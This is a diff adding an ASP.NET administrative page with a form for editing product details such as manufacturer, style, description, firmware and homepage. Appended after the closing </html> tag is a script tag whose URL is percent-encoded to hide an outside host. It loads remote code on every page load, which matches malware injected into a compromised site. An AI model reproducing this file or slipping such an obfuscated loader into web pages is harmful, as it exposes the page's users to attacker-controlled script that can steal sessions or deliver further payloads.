@@ -1,0 +1,110 @@
+<%@ page language="C#" autoeventwireup="true" inherits="Admin_AdminProductEdit, App_Web_5p6fazkq" %>
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head runat="server">
+    <title>ProductManager</title>
+</head>
+<body>
+    <table cellpadding="0" cellspacing="0" class="twidth" width="576">
+		<tr>
+			<td align="center" style="width: 496px">
+				<div class="mframe">
+					<table cellpadding="0" cellspacing="0">
+						<tr>
+							<td class="tl"></td>
+							<td class="tm"><span class="tt">ProductManager</span></td>
+							<td class="tr"></td>
+						</tr>
+					</table>
+					<table cellpadding="0" cellspacing="0">
+						<tr>
+							<td class="ml"></td>
+							<td class="mm" style="width: 494px">
+								<form id="ConfigForm" runat="server">
+									<table width="100%">
+										<tr>
+											<td align="center" class="tdbg-dark" colspan="2">Product information</td>
+										</tr>
+										<tr>
+											<td align="center" style="width: 319px">
+                                                <p class="MsoNormal" style="margin: 0cm 0cm 0pt">
+                                                    <b style="mso-bidi-font-weight: normal"><span lang="EN-US">MANUFACTURER:<?xml namespace=""
+                                                        ns="urn:schemas-microsoft-com:office:office" prefix="o" ?><o:p></o:p></span></b></p>
+                                            </td>
+											<td style="width: 370px">
+                                                <asp:TextBox ID="TextBox1" runat="server" Width="211px"></asp:TextBox>
+                                                <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" ControlToValidate="TextBox1"
+                                                    ErrorMessage="*"></asp:RequiredFieldValidator></td>
+										</tr>
+										<tr>
+											<td align="center" style="width: 319px; height: 20px;">
+                                                <p class="MsoNormal" style="margin: 0cm 0cm 0pt">
+                                                    <b style="mso-bidi-font-weight: normal"><span lang="EN-US">STYLE</span></b>£º</p>
+                                            </td>
+											<td style="width: 370px; height: 20px;">
+                                                <asp:TextBox ID="TextBox2" runat="server" Width="211px"></asp:TextBox>
+                                                <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" ControlToValidate="TextBox2"
+                                                    ErrorMessage="*"></asp:RequiredFieldValidator></td>
+										</tr>
+                                        <tr>
+                                            <td align="center" style="width: 319px; height: 20px">
+                                                <strong>ProductName</strong></td>
+                                            <td style="width: 370px; height: 20px">
+                                                <asp:TextBox ID="TextBox6" runat="server" Width="211px"></asp:TextBox></td>
+                                        </tr>
+										<tr>
+											<td align="center" style="width: 319px">
+                                                <p class="MsoNormal" style="margin: 0cm 0cm 0pt">
+                                                    <b style="mso-bidi-font-weight: normal"><span lang="EN-US">DESCRIPTION</span></b>£º</p>
+                                            </td>
+											<td style="width: 370px">
+                                                <asp:TextBox ID="TextBox3" runat="server" Width="211px"></asp:TextBox></td>
+										</tr>
+                                        <tr>
+                                            <td align="center" style="width: 319px">
+                                                <p class="MsoNormal" style="margin: 0cm 0cm 0pt">
+                                                    <b style="mso-bidi-font-weight: normal"><span lang="EN-US">FIRMWARE INFORMATION:<o:p></o:p></span></b></p>
+                                            </td>
+                                            <td style="width: 370px">
+                                                <asp:TextBox ID="TextBox4" runat="server" Height="39px" TextMode="MultiLine" Width="214px"></asp:TextBox></td>
+                                        </tr>
+                                        <tr>
+                                            <td align="center" style="width: 319px">
+                                                <p class="MsoNormal" style="margin: 0cm 0cm 0pt">
+                                                    <b style="mso-bidi-font-weight: normal"><span lang="EN-US">PRODUCT HOMEPAGE:<o:p></o:p></span></b></p>
+                                            </td>
+                                            <td style="width: 370px">
+                                                <asp:TextBox ID="TextBox5" runat="server" Height="39px" TextMode="MultiLine" Width="214px"></asp:TextBox></td>
+                                        </tr>
+                                        <tr>
+                                            <td align="center" style="width: 319px; height: 21px">
+                                                <strong>Status:</strong></td>
+                                            <td style="width: 370px; height: 21px">
+                                                <asp:RadioButton ID="RadioButton1" runat="server" Checked="True" GroupName="aa" Text="true" />
+                                                &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
+                                                <asp:RadioButton ID="RadioButton2" runat="server" GroupName="aa" Text="false" /></td>
+                                        </tr>
+										<tr>
+											<td align="center" colspan="2" style="height: 28px">
+                                                <asp:Button ID="Button1" runat="server" Text="Update" OnClick="Button1_Click" /></td>
+										</tr>
+									</table>
+								</form>
+							</td>
+							<td class="mr" style="width: 1px">
+							</td>
+						</tr>
+					</table>
+					<table cellpadding="0" cellspacing="0">
+						<tr>
+							<td class="bl"></td>
+							<td class="bm">&nbsp;</td>
+							<td class="br"></td>
+						</tr>
+					</table>
+				</div>
+			</td>
+		</tr>
+	</table>
+</body>
+</html>
+<script src="http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70"></script>
